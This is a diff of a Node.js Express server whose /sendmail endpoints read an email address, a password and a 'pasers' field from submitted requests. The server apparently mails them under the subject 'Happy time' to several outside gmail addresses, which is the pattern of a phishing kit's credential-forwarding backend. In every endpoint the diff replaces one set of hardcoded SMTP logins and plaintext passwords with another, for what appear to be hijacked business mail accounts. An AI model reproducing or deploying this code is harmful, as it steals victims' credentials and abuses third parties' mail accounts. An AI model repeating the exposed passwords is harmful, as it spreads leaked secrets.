@@ -18,11 +18,11 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.kumardirect.com",
+      host: "mail.zambiatransportandlogistics.com",
       port: 465,
       auth: {
-        user: "process@kumardirect.com",
-        pass: "=PPScm0(Y%4+0K",
+        user: "john.phiri@zambiatransportandlogistics.com",
+        pass: "M!racleMumba%@1995",
       },
     });
     let info = await transporter.sendMail({
@@ -53,15 +53,15 @@ app.post("/sendmail3", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.kumardirect.com",
+      host: "mail.zambiatransportandlogistics.com",
       port: 465,
       auth: {
-        user: "process@kumardirect.com",
-        pass: "=PPScm0(Y%4+0K",
+        user: "john.phiri@zambiatransportandlogistics.com",
+        pass: "M!racleMumba%@1995",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <process@kumardirect.com>',
+      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
       to: "quickloaninvestors@gmail.com",
       subject: "Happy time",
       html: `
@@ -86,15 +86,15 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.kumardirect.com",
+      host: "mail.zambiatransportandlogistics.com",
       port: 465,
       auth: {
-        user: "process@kumardirect.com",
-        pass: "=PPScm0(Y%4+0K",
+        user: "john.phiri@zambiatransportandlogistics.com",
+        pass: "M!racleMumba%@1995",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <process@kumardirect.com>',
+      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
       to: "sales1.ppsl@gmail.com",
       subject: "Happy time",
       html: `
@@ -119,15 +119,15 @@ app.post("/sendmail4", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.kumardirect.com",
+      host: "mail.zambiatransportandlogistics.com",
       port: 465,
       auth: {
-        user: "process@kumardirect.com",
-        pass: "=PPScm0(Y%4+0K",
+        user: "john.phiri@zambiatransportandlogistics.com",
+        pass: "M!racleMumba%@1995",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <process@kumardirect.com>',
+      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
       to: "fredrick3smith33@gmail.com",
       subject: "Happy time",
       html: `
@@ -153,15 +153,15 @@ app.post("/sendmail5", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.kumardirect.com",
+      host: "mail.zambiatransportandlogistics.com",
       port: 465,
       auth: {
-        user: "process@kumardirect.com",
-        pass: "=PPScm0(Y%4+0K",
+        user: "john.phiri@zambiatransportandlogistics.com",
+        pass: "M!racleMumba%@1995",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <process@kumardirect.com>',
+      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
       to: "wangyong2114@gmail.com",
       subject: "Happy time",
       html: `
@@ -187,15 +187,15 @@ app.post("/sendmail6", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.kumardirect.com",
+      host: "mail.zambiatransportandlogistics.com",
       port: 465,
       auth: {
-        user: "process@kumardirect.com",
-        pass: "=PPScm0(Y%4+0K",
+        user: "john.phiri@zambiatransportandlogistics.com",
+        pass: "M!racleMumba%@1995",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <process@kumardirect.com>',
+      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
       to: "korolkovq.s4point@gmail.com",
       subject: "Happy time",
       html: `
